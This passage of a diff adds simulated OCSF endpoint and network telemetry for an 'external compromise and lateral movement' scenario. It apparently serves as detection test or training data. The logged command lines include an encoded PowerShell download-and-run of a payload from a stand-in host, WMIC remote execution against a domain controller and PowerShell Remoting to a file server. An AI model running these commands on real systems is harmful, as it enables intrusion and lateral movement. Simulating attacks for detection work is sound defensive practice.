+        "name": "rundll32.exe",
+        "cmd_line": "rundll32.exe C:\\ProgramData\\WinCache\\updater.dat,StartW",
+        "created_time": 1778774435000,
+        "file": {
+          "name": "rundll32.exe",
+          "path": "C:\\Windows\\System32\\rundll32.exe",
+          "parent_folder": {
+            "path": "C:\\Windows\\System32"
+          }
+        },
+        "user": {
+          "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+          "name": "j.smith",
+          "email_addr": "j.smith@acme.local",
+          "domain": "ACME",
+          "type": "User",
+          "type_id": 1
+        },
+        "integrity": "High",
+        "parent_process": {
+          "uid": "proc:WS-FIN-023:4388:1778774418000",
+          "pid": 4388,
+          "name": "powershell.exe",
+          "cmd_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...; iwr https://cdn-update.example.net/a/px.dat -OutFile C:\\ProgramData\\WinCache\\updater.dat",
+          "created_time": 1778774418000,
+          "file": {
+            "name": "powershell.exe",
+            "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "parent_folder": {
+              "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0"
+            }
+          },
+          "user": {
+            "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+            "name": "j.smith",
+            "email_addr": "j.smith@acme.local",
+            "domain": "ACME",
+            "type": "User",
+            "type_id": 1
+          },
+          "integrity": "High",
+          "parent_process": {
+            "uid": "proc:WS-FIN-023:4320:1778774414000",
+            "pid": 4320,
+            "name": "cmd.exe",
+            "cmd_line": "cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...",
+            "created_time": 1778774414000,
+            "file": {
+              "name": "cmd.exe",
+              "path": "C:\\Windows\\System32\\cmd.exe",
+              "parent_folder": {
+                "path": "C:\\Windows\\System32"
+              }
+            },
+            "user": {
+              "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+              "name": "j.smith",
+              "email_addr": "j.smith@acme.local",
+              "domain": "ACME",
+              "type": "User",
+              "type_id": 1
+            },
+            "integrity": "High",
+            "parent_process": {
+              "uid": "proc:WS-FIN-023:884:1778772900000",
+              "pid": 884,
+              "name": "svchost.exe",
+              "cmd_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
+              "created_time": 1778772900000,
+              "file": {
+                "name": "svchost.exe",
+                "path": "C:\\Windows\\System32\\svchost.exe",
+                "parent_folder": {
+                  "path": "C:\\Windows\\System32"
+                }
+              },
+              "user": {
+                "uid": "S-1-5-18",
+                "name": "SYSTEM",
+                "type": "System",
+                "type_id": 3
+              },
+              "integrity": "System",
+              "parent_process": null
+            }
+          }
+        }
+      }
+    },
+    "launch_type": "Other",
+    "launch_type_id": 99,
+    "requested_permissions": "0x00000000",
+    "actual_permissions": "0x00000000",
+    "observables": [
+      {
+        "name": "device.hostname",
+        "type": "Hostname",
+        "type_id": 1,
+        "value": "WS-FIN-023.acme.local",
+        "record_id": "WS-FIN-023.acme.local"
+      },
+      {
+        "name": "actor.user.name",
+        "type": "User Name",
+        "type_id": 4,
+        "value": "j.smith",
+        "record_id": "user:j.smith"
+      },
+      {
+        "name": "actor.process.name",
+        "type": "Process Name",
+        "type_id": 9,
+        "value": "rundll32.exe",
+        "record_id": "procname:rundll32.exe"
+      },
+      {
+        "name": "process.name",
+        "type": "Process Name",
+        "type_id": 9,
+        "value": "wmic.exe",
+        "record_id": "procname:wmic.exe"
+      },
+      {
+        "name": "process.cmd_line",
+        "type": "Command Line",
+        "type_id": 13,
+        "value": "wmic.exe /node:10.10.10.5 process call create \"cmd.exe /c whoami > C:\\Windows\\Temp\\wmi.out\"",
+        "record_id": "cmd:4824"
+      },
+      {
+        "name": "process.file.path",
+        "type": "File Path",
+        "type_id": 45,
+        "value": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+        "record_id": "file:C:\\Windows\\System32\\wbem\\WMIC.exe"
+      }
+    ],
+    "raw_data": "{\"source\": \"simulator\", \"event_uid\": \"proc-0010\", \"scenario\": \"external compromise and lateral movement\"}"
+  },
+  {
+    "activity_id": 1,
+    "activity_name": "Open",
+    "category_uid": 4,
+    "category_name": "Network Activity",
+    "class_uid": 4001,
+    "class_name": "Network Activity",
+    "severity_id": 5,
+    "severity": "Critical",
+    "time": 1778774683000,
+    "timezone_offset": -420,
+    "type_uid": 400101,
+    "type_name": "Network Activity: Open",
+    "message": "WMIC lateral movement attempt opened RPC/DCOM connection from WS-FIN-023 to DC-01.",
+    "metadata": {
+      "uid": "meta-net-0011",
+      "version": "1.8.0",
+      "product": {
+        "uid": "product:acme-edr-sensor",
+        "name": "ACME Endpoint Sensor",
+        "vendor_name": "ACME Security",
+        "version": "6.8.2",
+        "feature": {
+          "name": "Endpoint Telemetry",
+          "uid": "edr-telemetry"
+        }
+      },
+      "profiles": [
+        "host",
+        "security_control"
+      ],
+      "logged_time": 1778774684500
+    },
+    "status_id": 1,
+    "status": "Success",
+    "status_code": "0",
+    "status_detail": "The activity was observed by endpoint sensor",
+    "device": {
+      "uid": "asset:acme:ws-fin-023",
+      "name": "WS-FIN-023",
+      "hostname": "WS-FIN-023.acme.local",
+      "ip": "10.10.20.25",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2,
+      "os": {
+        "name": "Microsoft Windows 11 Pro",
+        "type": "Windows",
+        "type_id": 100,
+        "version": "23H2",
+        "build": "22631.3593"
+      },
+      "domain": "ACME",
+      "org": {
+        "uid": "tenant:acme-corp",
+        "name": "ACME-CORP"
+      }
+    },
+    "src_endpoint": {
+      "ip": "10.10.20.25",
+      "port": 49918,
+      "hostname": "WS-FIN-023.acme.local",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2
+    },
+    "dst_endpoint": {
+      "ip": "10.10.10.5",
+      "port": 135,
+      "hostname": "DC-01.acme.local",
+      "mac": "00:50:56:AA:10:05",
+      "type": "Server",
+      "type_id": 1
+    },
+    "initiator_id": 1,
+    "initiator": "Source Endpoint",
+    "is_src_dst_assignment_known": true,
+    "connection_info": {
+      "uid": "conn:WS-FIN-023:10.10.20.25:49918:10.10.10.5:135:20260514T160443Z",
+      "direction": "Outbound",
+      "direction_id": 2,
+      "protocol_name": "TCP",
+      "protocol_num": 6,
+      "protocol_ver": "IPv4",
+      "tcp_flags": "SYN,ACK"
+    },
+    "app_protocol_name": "dcerpc",
+    "app_name": "DCERPC",
+    "traffic": {
+      "bytes_in": 12884,
+      "bytes_out": 67120,
+      "packets_in": 59,
+      "packets_out": 97
+    },
+    "observables": [
+      {
+        "name": "src_endpoint.ip",
+        "type": "IP Address",
+        "type_id": 2,
+        "value": "10.10.20.25",
+        "record_id": "10.10.20.25"
+      },
+      {
+        "name": "dst_endpoint.ip",
+        "type": "IP Address",
+        "type_id": 2,
+        "value": "10.10.10.5",
+        "record_id": "10.10.10.5"
+      },
+      {
+        "name": "dst_endpoint.port",
+        "type": "Port",
+        "type_id": 11,
+        "value": "135",
+        "record_id": "dst_endpoint.port:135"
+      },
+      {
+        "name": "device.hostname",
+        "type": "Hostname",
+        "type_id": 1,
+        "value": "WS-FIN-023.acme.local",
+        "record_id": "WS-FIN-023.acme.local"
+      }
+    ],
+    "raw_data": "{\"source\": \"simulator\", \"conn_uid\": \"conn:WS-FIN-023:10.10.20.25:49918:10.10.10.5:135:20260514T160443Z\", \"scenario\": \"external compromise and lateral movement\"}"
+  },
+  {
+    "activity_id": 1,
+    "activity_name": "Launch",
+    "category_uid": 1,
+    "category_name": "System Activity",
+    "class_uid": 1007,
+    "class_name": "Process Activity",
+    "severity_id": 5,
+    "severity": "Critical",
+    "time": 1778774720000,
+    "timezone_offset": -420,
+    "type_uid": 100701,
+    "type_name": "Process Activity: Launch",
+    "message": "Compromised host launched PowerShell Remoting command against FS-01.",
+    "metadata": {
+      "uid": "meta-proc-0012",
+      "version": "1.8.0",
+      "product": {
+        "uid": "product:acme-edr-sensor",
+        "name": "ACME Endpoint Sensor",
+        "vendor_name": "ACME Security",
+        "version": "6.8.2",
+        "feature": {
+          "name": "Endpoint Telemetry",
+          "uid": "edr-telemetry"
+        }
+      },
+      "profiles": [
+        "host",
+        "security_control"
+      ],
+      "logged_time": 1778774721200
+    },
+    "status_id": 1,
+    "status": "Success",
+    "status_code": "0",
+    "status_detail": "The activity was observed by endpoint sensor",
+    "device": {
+      "uid": "asset:acme:ws-fin-023",
+      "name": "WS-FIN-023",
+      "hostname": "WS-FIN-023.acme.local",
+      "ip": "10.10.20.25",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2,
+      "os": {
+        "name": "Microsoft Windows 11 Pro",
+        "type": "Windows",
+        "type_id": 100,
+        "version": "23H2",
+        "build": "22631.3593"
+      },
+      "domain": "ACME",
+      "org": {
+        "uid": "tenant:acme-corp",
+        "name": "ACME-CORP"
+      }
+    },
+    "actor": {
+      "process": {
+        "uid": "proc:WS-FIN-023:4512:1778774435000",
+        "pid": 4512,
+        "name": "rundll32.exe",
+        "cmd_line": "rundll32.exe C:\\ProgramData\\WinCache\\updater.dat,StartW",
+        "created_time": 1778774435000,
+        "file": {
+          "name": "rundll32.exe",
+          "path": "C:\\Windows\\System32\\rundll32.exe",
+          "parent_folder": {
+            "path": "C:\\Windows\\System32"
+          }
+        },
+        "user": {
+          "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+          "name": "j.smith",
+          "email_addr": "j.smith@acme.local",
+          "domain": "ACME",
+          "type": "User",
+          "type_id": 1
+        },
+        "integrity": "High",
+        "parent_process": {
+          "uid": "proc:WS-FIN-023:4388:1778774418000",
+          "pid": 4388,
+          "name": "powershell.exe",
+          "cmd_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...; iwr https://cdn-update.example.net/a/px.dat -OutFile C:\\ProgramData\\WinCache\\updater.dat",
+          "created_time": 1778774418000,
+          "file": {
+            "name": "powershell.exe",
+            "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "parent_folder": {
+              "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0"
+            }
+          },
+          "user": {
+            "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+            "name": "j.smith",
+            "email_addr": "j.smith@acme.local",
+            "domain": "ACME",
+            "type": "User",
+            "type_id": 1
+          },
+          "integrity": "High",
+          "parent_process": {
+            "uid": "proc:WS-FIN-023:4320:1778774414000",
+            "pid": 4320,
+            "name": "cmd.exe",
+            "cmd_line": "cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...",
+            "created_time": 1778774414000,
+            "file": {
+              "name": "cmd.exe",
+              "path": "C:\\Windows\\System32\\cmd.exe",
+              "parent_folder": {
+                "path": "C:\\Windows\\System32"
+              }
+            },
+            "user": {
+              "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+              "name": "j.smith",
+              "email_addr": "j.smith@acme.local",
+              "domain": "ACME",
+              "type": "User",
+              "type_id": 1
+            },
+            "integrity": "High",
+            "parent_process": {
+              "uid": "proc:WS-FIN-023:884:1778772900000",
+              "pid": 884,
+              "name": "svchost.exe",
+              "cmd_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
+              "created_time": 1778772900000,
+              "file": {
+                "name": "svchost.exe",
+                "path": "C:\\Windows\\System32\\svchost.exe",
+                "parent_folder": {
+                  "path": "C:\\Windows\\System32"
+                }
+              },
+              "user": {
+                "uid": "S-1-5-18",
+                "name": "SYSTEM",
+                "type": "System",
+                "type_id": 3
+              },
+              "integrity": "System",
+              "parent_process": null
+            }
+          }
+        }
+      },
+      "user": {
+        "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+        "name": "j.smith",
+        "email_addr": "j.smith@acme.local",
+        "domain": "ACME",
+        "type": "User",
+        "type_id": 1
+      },
+      "session": {
+        "uid": "logon:WS-FIN-023:ACME:j.smith:20260514T154000Z",
+        "created_time": 1778773200000
+      }
+    },
+    "process": {
+      "uid": "proc:WS-FIN-023:4968:1778774720000",
+      "pid": 4968,
+      "name": "powershell.exe",
+      "cmd_line": "powershell.exe -NoProfile -Command Invoke-Command -ComputerName FS-01 -ScriptBlock {hostname; whoami}",
+      "created_time": 1778774720000,
+      "file": {
+        "name": "powershell.exe",
+        "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "parent_folder": {
+          "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0"
+        }
+      },
+      "user": {
+        "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+        "name": "j.smith",
+        "email_addr": "j.smith@acme.local",
+        "domain": "ACME",
+        "type": "User",
+        "type_id": 1
+      },
+      "integrity": "High",
+      "parent_process": {
+        "uid": "proc:WS-FIN-023:4512:1778774435000",
+        "pid": 4512,
+        "name": "rundll32.exe",
+        "cmd_line": "rundll32.exe C:\\ProgramData\\WinCache\\updater.dat,StartW",
+        "created_time": 1778774435000,
+        "file": {
+          "name": "rundll32.exe",
+          "path": "C:\\Windows\\System32\\rundll32.exe",
+          "parent_folder": {
+            "path": "C:\\Windows\\System32"
+          }
+        },
+        "user": {
+          "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+          "name": "j.smith",
+          "email_addr": "j.smith@acme.local",
+          "domain": "ACME",
+          "type": "User",
+          "type_id": 1
+        },
+        "integrity": "High",
+        "parent_process": {
+          "uid": "proc:WS-FIN-023:4388:1778774418000",
+          "pid": 4388,
+          "name": "powershell.exe",
+          "cmd_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...; iwr https://cdn-update.example.net/a/px.dat -OutFile C:\\ProgramData\\WinCache\\updater.dat",
+          "created_time": 1778774418000,
+          "file": {
+            "name": "powershell.exe",
+            "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "parent_folder": {
+              "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0"
+            }
+          },
+          "user": {
+            "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+            "name": "j.smith",
+            "email_addr": "j.smith@acme.local",
+            "domain": "ACME",
+            "type": "User",
+            "type_id": 1
+          },
+          "integrity": "High",
+          "parent_process": {
+            "uid": "proc:WS-FIN-023:4320:1778774414000",
+            "pid": 4320,
+            "name": "cmd.exe",
+            "cmd_line": "cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...",
+            "created_time": 1778774414000,
+            "file": {
+              "name": "cmd.exe",
+              "path": "C:\\Windows\\System32\\cmd.exe",
+              "parent_folder": {
+                "path": "C:\\Windows\\System32"
+              }
+            },
+            "user": {
+              "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+              "name": "j.smith",
+              "email_addr": "j.smith@acme.local",
+              "domain": "ACME",
+              "type": "User",
+              "type_id": 1
+            },
+            "integrity": "High",
+            "parent_process": {
+              "uid": "proc:WS-FIN-023:884:1778772900000",
+              "pid": 884,
+              "name": "svchost.exe",
+              "cmd_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
+              "created_time": 1778772900000,
+              "file": {
+                "name": "svchost.exe",
+                "path": "C:\\Windows\\System32\\svchost.exe",
+                "parent_folder": {
+                  "path": "C:\\Windows\\System32"
+                }
+              },
+              "user": {
+                "uid": "S-1-5-18",
+                "name": "SYSTEM",
+                "type": "System",
+                "type_id": 3
+              },
+              "integrity": "System",
+              "parent_process": null
+            }
+          }
+        }
+      }
+    },
+    "launch_type": "Other",
+    "launch_type_id": 99,
+    "requested_permissions": "0x00000000",
+    "actual_permissions": "0x00000000",
+    "observables": [
+      {
+        "name": "device.hostname",
+        "type": "Hostname",
+        "type_id": 1,
+        "value": "WS-FIN-023.acme.local",
+        "record_id": "WS-FIN-023.acme.local"
+      },
+      {
+        "name": "actor.user.name",
+        "type": "User Name",
+        "type_id": 4,
+        "value": "j.smith",
+        "record_id": "user:j.smith"
+      },
+      {
+        "name": "actor.process.name",
+        "type": "Process Name",
+        "type_id": 9,
+        "value": "rundll32.exe",
+        "record_id": "procname:rundll32.exe"
+      },
+      {
+        "name": "process.name",
+        "type": "Process Name",
+        "type_id": 9,
+        "value": "powershell.exe",
+        "record_id": "procname:powershell.exe"
+      },
+      {
+        "name": "process.cmd_line",
+        "type": "Command Line",
+        "type_id": 13,
+        "value": "powershell.exe -NoProfile -Command Invoke-Command -ComputerName FS-01 -ScriptBlock {hostname; whoami}",
+        "record_id": "cmd:4968"
+      },
+      {
+        "name": "process.file.path",
+        "type": "File Path",
+        "type_id": 45,
+        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "record_id": "file:C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      }
+    ],
+    "raw_data": "{\"source\": \"simulator\", \"event_uid\": \"proc-0012\", \"scenario\": \"external compromise and lateral movement\"}"
+  },
+  {
+    "activity_id": 1,
+    "activity_name": "Open",
+    "category_uid": 4,
+    "category_name": "Network Activity",
+    "class_uid": 4001,
+    "class_name": "Network Activity",
+    "severity_id": 5,
+    "severity": "Critical",
+    "time": 1778774723000,
+    "timezone_offset": -420,
+    "type_uid": 400101,
+    "type_name": "Network Activity: Open",
+    "message": "PowerShell Remoting connection from compromised workstation to file server FS-01.",
+    "metadata": {
+      "uid": "meta-net-0013",
+      "version": "1.8.0",
+      "product": {
+        "uid": "product:acme-edr-sensor",
+        "name": "ACME Endpoint Sensor",
+        "vendor_name": "ACME Security",
+        "version": "6.8.2",
+        "feature": {
+          "name": "Endpoint Telemetry",
+          "uid": "edr-telemetry"
+        }
+      },
+      "profiles": [
+        "host",
+        "security_control"
+      ],
+      "logged_time": 1778774724500
+    },
+    "status_id": 1,
+    "status": "Success",
+    "status_code": "0",
+    "status_detail": "The activity was observed by endpoint sensor",
+    "device": {
+      "uid": "asset:acme:ws-fin-023",
+      "name": "WS-FIN-023",
+      "hostname": "WS-FIN-023.acme.local",
+      "ip": "10.10.20.25",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2,
+      "os": {
+        "name": "Microsoft Windows 11 Pro",
+        "type": "Windows",
+        "type_id": 100,
+        "version": "23H2",
+        "build": "22631.3593"
+      },
+      "domain": "ACME",
+      "org": {
+        "uid": "tenant:acme-corp",
+        "name": "ACME-CORP"
+      }
+    },
+    "src_endpoint": {
+      "ip": "10.10.20.25",
+      "port": 49944,
+      "hostname": "WS-FIN-023.acme.local",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2
+    },
+    "dst_endpoint": {
+      "ip": "10.10.30.20",
+      "port": 5985,
+      "hostname": "FS-01.acme.local",
+      "mac": "00:50:56:AA:30:20",
+      "type": "Server",
+      "type_id": 1
+    },
+    "initiator_id": 1,
+    "initiator": "Source Endpoint",
+    "is_src_dst_assignment_known": true,
+    "connection_info": {
+      "uid": "conn:WS-FIN-023:10.10.20.25:49944:10.10.30.20:5985:20260514T160523Z",
+      "direction": "Outbound",
+      "direction_id": 2,
+      "protocol_name": "TCP",
+      "protocol_num": 6,
+      "protocol_ver": "IPv4",
+      "tcp_flags": "SYN,ACK"
+    },
+    "app_protocol_name": "wsman",
+    "app_name": "WinRM",
+    "traffic": {
+      "bytes_in": 22104,
+      "bytes_out": 115023,
+      "packets_in": 72,
+      "packets_out": 143
+    },
+    "observables": [
+      {
+        "name": "src_endpoint.ip",
+        "type": "IP Address",
+        "type_id": 2,
+        "value": "10.10.20.25",
+        "record_id": "10.10.20.25"
+      },
+      {
+        "name": "dst_endpoint.ip",
+        "type": "IP Address",
+        "type_id": 2,
+        "value": "10.10.30.20",
+        "record_id": "10.10.30.20"
+      },
+      {
+        "name": "dst_endpoint.port",
+        "type": "Port",
+        "type_id": 11,
+        "value": "5985",
+        "record_id": "dst_endpoint.port:5985"
+      },
+      {
+        "name": "device.hostname",
+        "type": "Hostname",
+        "type_id": 1,
+        "value": "WS-FIN-023.acme.local",
+        "record_id": "WS-FIN-023.acme.local"
+      }
+    ],
+    "raw_data": "{\"source\": \"simulator\", \"conn_uid\": \"conn:WS-FIN-023:10.10.20.25:49944:10.10.30.20:5985:20260514T160523Z\", \"scenario\": \"external compromise and lateral movement\"}"
+  },
+  {
+    "activity_id": 4,
+    "activity_name": "Fail",
+    "category_uid": 4,
+    "category_name": "Network Activity",
+    "class_uid": 4001,
+    "class_name": "Network Activity",
+    "severity_id": 3,
+    "severity": "Medium",
+    "time": 1778774764000,
+    "timezone_offset": -420,
+    "type_uid": 400104,
+    "type_name": "Network Activity: Fail",
+    "message": "Compromised workstation attempted SMB connection to non-existent internal host during lateral discovery.",
+    "metadata": {
+      "uid": "meta-net-0014",
+      "version": "1.8.0",
+      "product": {
+        "uid": "product:acme-edr-sensor",
+        "name": "ACME Endpoint Sensor",
+        "vendor_name": "ACME Security",
+        "version": "6.8.2",
+        "feature": {
+          "name": "Endpoint Telemetry",
+          "uid": "edr-telemetry"
+        }
+      },
+      "profiles": [
+        "host",
+        "security_control"
+      ],
+      "logged_time": 1778774765500
+    },
+    "status_id": 2,
+    "status": "Failure",
+    "status_code": "0",
+    "status_detail": "Connection attempt did not complete",
+    "device": {
+      "uid": "asset:acme:ws-fin-023",
+      "name": "WS-FIN-023",
+      "hostname": "WS-FIN-023.acme.local",
+      "ip": "10.10.20.25",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2,
+      "os": {
+        "name": "Microsoft Windows 11 Pro",
+        "type": "Windows",
+        "type_id": 100,
+        "version": "23H2",
+        "build": "22631.3593"
+      },
+      "domain": "ACME",
+      "org": {
+        "uid": "tenant:acme-corp",
+        "name": "ACME-CORP"
+      }
+    },
+    "src_endpoint": {
+      "ip": "10.10.20.25",
+      "port": 49980,
+      "hostname": "WS-FIN-023.acme.local",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2
+    },
+    "dst_endpoint": {
+      "ip": "10.10.40.15",
+      "port": 445,
+      "type": "Unknown",
+      "type_id": 0
+    },
+    "initiator_id": 1,
+    "initiator": "Source Endpoint",
+    "is_src_dst_assignment_known": true,
+    "connection_info": {
+      "uid": "conn:WS-FIN-023:10.10.20.25:49980:10.10.40.15:445:20260514T160604Z",
+      "direction": "Outbound",
+      "direction_id": 2,
+      "protocol_name": "TCP",
+      "protocol_num": 6,
+      "protocol_ver": "IPv4",
+      "tcp_flags": "SYN,ACK"
+    },
+    "app_protocol_name": "smb",
+    "app_name": "SMB",
+    "traffic": {
+      "bytes_in": 0,
+      "bytes_out": 180,
+      "packets_in": 0,
+      "packets_out": 3
+    },
+    "observables": [
+      {
+        "name": "src_endpoint.ip",
+        "type": "IP Address",
+        "type_id": 2,
+        "value": "10.10.20.25",
+        "record_id": "10.10.20.25"
+      },
+      {
+        "name": "dst_endpoint.ip",
+        "type": "IP Address",
+        "type_id": 2,
+        "value": "10.10.40.15",
+        "record_id": "10.10.40.15"
+      },
+      {
+        "name": "dst_endpoint.port",
+        "type": "Port",
+        "type_id": 11,
+        "value": "445",
+        "record_id": "dst_endpoint.port:445"
+      },
+      {
+        "name": "device.hostname",
+        "type": "Hostname",
+        "type_id": 1,
+        "value": "WS-FIN-023.acme.local",
+        "record_id": "WS-FIN-023.acme.local"
+      }
+    ],
+    "raw_data": "{\"source\": \"simulator\", \"conn_uid\": \"conn:WS-FIN-023:10.10.20.25:49980:10.10.40.15:445:20260514T160604Z\", \"scenario\": \"external compromise and lateral movement\"}"
+  },
+  {
+    "activity_id": 1,
+    "activity_name": "Create",
+    "category_uid": 2,
+    "category_name": "Findings",
+    "class_uid": 2004,
+    "class_name": "Detection Finding",
+    "severity_id": 5,
+    "severity": "Critical",
+    "time": 1778774790000,
+    "timezone_offset": -420,
+    "type_uid": 200401,
+    "type_name": "Detection Finding: Create",
+    "message": "Lateral movement: WS-FIN-023 pivoted to DC-01 and FS-01 using SMB, WMIC and WinRM",
+    "metadata": {
+      "uid": "meta-find-0015",
+      "version": "1.8.0",
+      "product": {
+        "uid": "product:acme-xdr-correlation",
+        "name": "ACME XDR Correlation Engine",
+        "vendor_name": "ACME Security",
+        "version": "6.8.2",
+        "feature": {
+          "name": "Detection Engine",
+          "uid": "xdr-detect"
+        }
+      },
+      "profiles": [
+        "host",
+        "security_control"
+      ],
+      "logged_time": 1778774791000,
+      "event_code": "detection_finding",
+      "correlation_uid": "corr-attack-chain-20260514-WS-FIN-023"
+    },
+    "status_id": 1,
+    "status": "New",
+    "status_code": "0",
+    "status_detail": "The activity was observed by endpoint sensor",
+    "finding_info": {
+      "uid": "finding-0015",
+      "title": "Lateral movement: WS-FIN-023 pivoted to DC-01 and FS-01 using SMB, WMIC and WinRM",
+      "desc": "The compromised workstation initiated administrative share access, WMIC remote process execution toward DC-01, PowerShell Remoting to FS-01, and SMB discovery to additional internal hosts.",
+      "created_time": 1778774790000,
+      "first_seen_time": 1778774648000,
+      "last_seen_time": 1778774764000,
+      "modified_time": 1778774790000,
+      "product_uid": "product:acme-xdr-correlation",
+      "types": [
+        "Endpoint Detection",
+        "Correlation"
+      ],
+      "related_events": [
+        {
+          "uid": "meta-proc-0008",
+          "type": "OCSF Event"
+        },
+        {
+          "uid": "meta-net-0009",
+          "type": "OCSF Event"
+        },
+        {
+          "uid": "meta-proc-0010",
+          "type": "OCSF Event"
+        },
+        {
+          "uid": "meta-net-0011",
+          "type": "OCSF Event"
+        },
+        {
+          "uid": "meta-proc-0012",
+          "type": "OCSF Event"
+        },
+        {
+          "uid": "meta-net-0013",
+          "type": "OCSF Event"
+        },
+        {
+          "uid": "meta-net-0014",
+          "type": "OCSF Event"
+        }
+      ],
+      "attacks": [
+        {
+          "uid": "T1021.002",
+          "name": "SMB/Windows Admin Shares",
+          "tactic": {
+            "uid": "TA0008",
+            "name": "Lateral Movement"
+          }
+        },
+        {
+          "uid": "T1047",
+          "name": "Windows Management Instrumentation",
+          "tactic": {
+            "uid": "TA0002",
+            "name": "Execution"
+          }
+        },
+        {
+          "uid": "T1021.006",
+          "name": "Windows Remote Management",
+          "tactic": {
+            "uid": "TA0008",
+            "name": "Lateral Movement"
+          }
+        },
+        {
+          "uid": "T1087",
+          "name": "Account Discovery",
+          "tactic": {
+            "uid": "TA0007",
+            "name": "Discovery"
+          }
+        }
+      ]
+    },
+    "device": {
+      "uid": "asset:acme:ws-fin-023",
+      "name": "WS-FIN-023",
+      "hostname": "WS-FIN-023.acme.local",
+      "ip": "10.10.20.25",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2,
+      "os": {
+        "name": "Microsoft Windows 11 Pro",
+        "type": "Windows",
+        "type_id": 100,
+        "version": "23H2",
+        "build": "22631.3593"
+      },
+      "domain": "ACME",
+      "org": {
+        "uid": "tenant:acme-corp",
+        "name": "ACME-CORP"
+      }
+    },
+    "resources": [
+      {
+        "uid": "asset:acme:ws-fin-023",
+        "name": "WS-FIN-023.acme.local",
+        "type": "Device",
+        "region": "on-prem",
+        "data": {
+          "uid": "asset:acme:ws-fin-023",
+          "name": "WS-FIN-023",
+          "hostname": "WS-FIN-023.acme.local",
+          "ip": "10.10.20.25",
+          "mac": "00:50:56:AA:20:25",
+          "type": "Desktop",
+          "type_id": 2,
+          "os": {
+            "name": "Microsoft Windows 11 Pro",
+            "type": "Windows",
+            "type_id": 100,
+            "version": "23H2",
+            "build": "22631.3593"
+          },
+          "domain": "ACME",
+          "org": {
+            "uid": "tenant:acme-corp",
+            "name": "ACME-CORP"
+          }
+        }
+      },
+      {
+        "uid": "asset:acme:dc-01",
+        "name": "DC-01.acme.local",
+        "type": "Device",
+        "region": "on-prem",
+        "data": {
+          "uid": "asset:acme:dc-01",
+          "name": "DC-01",
+          "hostname": "DC-01.acme.local",
+          "ip": "10.10.10.5",
+          "mac": "00:50:56:AA:10:05",
+          "type": "Server",
+          "type_id": 1,
+          "os": {
+            "name": "Microsoft Windows Server 2022",
+            "type": "Windows",
+            "type_id": 100,
+            "version": "21H2",
+            "build": "20348"
+          },
+          "domain": "ACME",
+          "org": {
+            "uid": "tenant:acme-corp",
+            "name": "ACME-CORP"
+          }
+        }
+      },
+      {
+        "uid": "asset:acme:fs-01",
+        "name": "FS-01.acme.local",
+        "type": "Device",
+        "region": "on-prem",
+        "data": {
+          "uid": "asset:acme:fs-01",
+          "name": "FS-01",
+          "hostname": "FS-01.acme.local",
+          "ip": "10.10.30.20",
+          "mac": "00:50:56:AA:30:20",
+          "type": "Server",
+          "type_id": 1,
+          "os": {
+            "name": "Microsoft Windows Server 2019",
+            "type": "Windows",
+            "type_id": 100,
+            "version": "1809",
+            "build": "17763"
+          },
+          "domain": "ACME",
+          "org": {
+            "uid": "tenant:acme-corp",
+            "name": "ACME-CORP"
+          }
+        }
+      }
+    ],
+    "evidences": [
+      {
+        "uid": "evidence:finding-0015:1",
+        "name": "related_event",
+        "desc": "Related OCSF event that contributed to the finding.",
+        "data": {
+          "event_uid": "meta-proc-0008"
+        }
+      },
+      {
+        "uid": "evidence:finding-0015:2",
+        "name": "related_event",
+        "desc": "Related OCSF event that contributed to the finding.",
+        "data": {
+          "event_uid": "meta-net-0009"
+        }
+      },
+      {
+        "uid": "evidence:finding-0015:3",
+        "name": "related_event",
+        "desc": "Related OCSF event that contributed to the finding.",
+        "data": {
+          "event_uid": "meta-proc-0010"
+        }
+      },
+      {
+        "uid": "evidence:finding-0015:4",
+        "name": "related_event",
+        "desc": "Related OCSF event that contributed to the finding.",
+        "data": {
+          "event_uid": "meta-net-0011"
+        }
+      },
+      {
+        "uid": "evidence:finding-0015:5",
+        "name": "related_event",
